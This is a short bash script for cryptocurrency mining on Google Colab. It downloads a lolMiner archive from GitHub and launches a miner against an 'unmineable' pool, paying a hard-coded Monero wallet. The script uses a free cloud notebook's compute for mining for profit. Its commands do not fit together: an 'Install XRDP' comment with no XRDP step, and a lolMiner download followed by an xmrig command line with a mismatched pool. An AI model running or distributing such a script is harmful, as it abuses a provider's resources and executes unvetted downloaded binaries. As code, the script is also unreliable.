#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/Lolliedieb/lolMiner-releases/download/v1.54/lolMiner_v1.54_Lin64.tar.gz
tar xvzf lolMiner_v1.54_Lin64.tar.gz
ls
cd lolMiner_v1.54
./xmrig --donate-level 5 -o ethash.unmineable.com:3333 -u 42kNhuQvXeRa4KhefCZAE9NuqYN2Tb1WgCP16DCxDAyzPGQXmTFsijZ6TLxbjfD5EbEo77mzFWYqXJUfSZwFsJCwLqJfx9E -k --coin monero -a rx/0
